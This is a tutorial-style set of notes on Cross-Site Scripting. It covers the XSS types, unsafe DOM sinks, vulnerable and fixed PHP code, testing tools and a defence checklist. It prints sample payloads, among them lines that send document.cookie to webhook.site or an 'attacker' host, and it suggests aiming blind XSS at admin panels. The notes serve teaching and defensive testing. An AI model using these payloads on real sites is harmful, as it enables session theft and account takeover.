# 09 - Cross-Site Scripting (XSS)

## Introduction
- Cross-Site Scripting (XSS) is a client-side code injection vulnerability where attackers cause a victim's browser to execute malicious JavaScript by injecting payloads into web pages (forums, comments, messaging, search bars, etc.).

## Effects of XSS
- Session cookie theft (account takeover).
- Leakage of sensitive data (forms, tokens, page content).
- Unauthorized actions (use victim permissions to change data, add admins).
- Defacement or content manipulation (social-engineering vectors).
- Can be chained into other attacks (CSRF, session hijacking).

## XSS Types (high-level)
- Reflected (non-persistent): payload is sent in a request and reflected in the response (usually via URL). Requires victim to click a crafted link.
- Stored (persistent): payload is saved on the server (DB/logs) and executed whenever other users view the stored content.
- DOM-based: client-side JS manipulates the DOM insecurely (e.g., innerHTML, eval) and executes payloads without server-side reflection.
- Blind XSS: variant of Stored XSS where payload triggers in admin/backend contexts (logs, admin panels) and the attacker only learns when triggered.

## Key concepts & primitives
- DOM: the client-side tree representation of the page that JS manipulates. Unsafe DOM sinks include `innerHTML`, `document.write`, `eval`, `setTimeout` with strings, etc.
- Payload: the malicious snippet (e.g., `<script>alert(1)</script>` or event attributes, SVG, onerror). Payloads are tailored to context (HTML, attributes, JS, URL, CSS).
- CSP (Content Security Policy): restricts script sources (e.g., `Content-Security-Policy: script-src 'self' https://apis.example.com`). A useful mitigation when configured strictly.

## Common JS functions/objects used in attacks
- `alert()`, `prompt()`, `confirm()` — simple proof-of-concept payloads.
- `eval()` — executes strings as code (dangerous when fed user input).
- `fetch()` / `XMLHttpRequest` — exfiltrate data (cookies, tokens) to attacker-controlled endpoints.
- `document.cookie`, `localStorage`, `sessionStorage` — read session/credential material.

## Typical HTML vectors
- `<script>...</script>`, `<img src=x onerror=...>`, `<iframe>`, `<svg onload=...>`, unclosed tags that allow injection into attributes or scripts.

## Examples (conceptual)
- Reflected URL example: `https://example.com/home?search=<script>alert(1)</script>` — server reflects `search` parameter into page without encoding.
- Stored XSS: user-submitted `message=<script>fetch('https://webhook.../?data='+document.cookie)</script>` gets stored and runs whenever the message is viewed.
- DOM XSS (unsafe sink): `document.getElementById('output').innerHTML = window.location.hash.substring(1);` with `https://site/#<script>alert(1)</script>`.

## Vulnerable code patterns & fixes (PHP examples from source)
- Vulnerable pattern (direct output):
	- echo '<div>No Result Found for <b>' . $q . '</b></div>'
- Safe pattern (output encoding):
	- echo '<div>No Result Found for <b>' . htmlspecialchars($q, ENT_QUOTES, 'UTF-8') . '</b></div>'
- For JS insertion, encode/validate values before echoing into scripts; consider JSON-encoding values and using safe DOM APIs rather than `innerHTML`.

## Blind XSS & HTTP header XSS
- Blind XSS: payloads stored in logs, tickets, or profiles that execute when viewed by admins. Target high-privilege viewers.
- HTTP header XSS: headers like `User-Agent`, `Referer`, `X-Forwarded-For` can carry payloads; if logged and rendered in admin UI without encoding, they execute.

## Session hijacking notes
- XSS can steal `document.cookie` or tokens (localStorage) and send them to attacker servers (e.g., `fetch('https://attacker/?c='+document.cookie)`).
- HttpOnly cookies mitigate `document.cookie` reads; however, other leaks (endpoints that return session data, localStorage) can make HttpOnly insufficient if the app exposes session values.

## Common payloads (examples for testing)
- Proof-of-concept: `<script>alert('XSS')</script>`
- Cookie theft: `<script>fetch('https://webhook.site/ID?c='+document.cookie)</script>`
- Event-based: `<img src=x onerror=alert(1)>`, `<svg onload=alert(1)>`
- Attribute and broken-tag tricks: `"><script>alert(1)</script>`

## Detection & testing tools
- XSStrike — fuzzing + DOM testing (https://github.com/s0md3v/XSStrike).
- XSSCon — lightweight scanner (https://github.com/menkrep1337/XSSCon).
- BeEF — Browser Exploitation Framework for post-exploitation control of hooked browsers (https://github.com/beefproject/beef).
- Use Burp, automated payload lists (PayloadsAllTheThings / SecLists) and manual context-aware testing.

## HttpOnly flag and bypass considerations
- `HttpOnly` prevents JS from reading cookies via `document.cookie` but does not stop other exfiltration methods if the app exposes session IDs in responses or localStorage.
- Examples of indirect leakage: endpoints returning session info, `phpinfo()` pages, or accessible APIs that include session values — these can be fetched and exfiltrated by injected JS.

## Mitigations / defense checklist
- Output encoding: use context-aware encoding (HTML-escape for HTML, JS-encode for JS contexts, attribute-encode for attributes).
- Input validation: validate input by type/shape; do not rely on validation alone for XSS defense.
- Use `htmlspecialchars()` (PHP) or equivalent templating/escaping functions.
- CSP: implement strict Content-Security-Policy (`script-src 'self'` + nonces/hashes) where possible.
- Set cookies with `HttpOnly` and `Secure`, and consider `SameSite`.
- Avoid `innerHTML`, `eval`, `document.write` with user data; use safe DOM APIs (textContent, setAttribute) and JSON-encoding for data inserted into scripts.
- Logging/display controls: encode log/headers when rendered in admin dashboards.
- Monitor and alert on unusual payload patterns; reduce attack surface (limit where HTML/JS can be inserted).

## Practical notes / workflow
1. Start with passive discovery and parameter inspection. 2. Use automated scanners (XSStrike/XSSCon) then manual verify with context-aware payloads. 3. For stored/blind XSS target admin views and logs. 4. When testing exfiltration demos, use controlled endpoints (webhook.site) and get authorization.

## References / payload lists
- PayloadsAllTheThings XSS, SecLists XSS fuzzing lists, PayloadBox, AwesomeXSS (links provided in original text).


